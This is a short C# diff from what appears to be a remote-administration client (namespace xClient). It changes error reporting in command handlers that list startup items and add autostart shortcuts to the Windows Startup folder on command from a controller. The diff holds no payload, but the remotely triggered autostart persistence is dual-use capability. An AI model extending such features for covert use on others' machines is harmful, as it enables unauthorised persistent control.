@@ -46,9 +46,9 @@ namespace xClient.Core.Commands
                         break;
                 }
             }
-            catch
+            catch (Exception ex)
             {
-                new Packets.ClientPackets.Status("Action failed!").Execute(client);
+                new Packets.ClientPackets.Status(string.Format("Action failed: {0}", ex.Message)).Execute(client);
             }
         }
 
@@ -134,9 +134,9 @@ namespace xClient.Core.Commands
 
                 new Packets.ClientPackets.GetStartupItemsResponse(startupItems).Execute(client);
             }
-            catch
+            catch (Exception ex)
             {
-                new Packets.ClientPackets.Status("Startup Information failed!").Execute(client);
+                new Packets.ClientPackets.Status(string.Format("Getting Autostart Items failed: {0}", ex.Message)).Execute(client);
             }
         }
 
@@ -215,15 +215,7 @@ namespace xClient.Core.Commands
                     case 6:
                         if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup)))
                         {
-                            try
-                            {
-                                Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.Startup));
-                            }
-                            catch (Exception ex)
-                            {
-                                new Packets.ClientPackets.Status(string.Format("Adding Autostart Item failed: {0}", ex.Message)).Execute(client);
-                                return;
-                            }
+                            Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.Startup));
                         }
 
                         string lnkPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup),
